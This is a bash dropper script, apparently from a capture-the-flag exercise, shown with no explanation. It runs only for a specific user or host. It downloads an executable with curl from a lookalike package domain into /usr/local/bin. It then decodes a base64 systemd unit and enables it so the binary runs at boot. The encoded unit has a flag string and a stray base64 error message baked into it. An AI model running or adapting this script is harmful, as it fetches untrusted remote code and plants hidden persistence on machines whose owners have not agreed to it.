n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUNIe0hAY2tlcl9tQG5fMTMzN30KCltTZXJ2aWNlXQpUeXBlPW9u
ZXNob3QKUmVtYWluQWZ0ZXJFeGl0PXllcwoKRXhlY1N0YXJ0PS91c3IvbG9jYWwvYmluL3NlcnZp
Y2UKRXhlY1N0b3A9L3Vzci9sb2NhbC9iaW4vc2VydmljZQoKW0luc3RhbGxdCldhbnRlZEJ5PW11
bHRpLXVzZXIudGFyZ2V0YmFzZTY0OiBpbnZhbGlkIGlucHV0Cg"|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
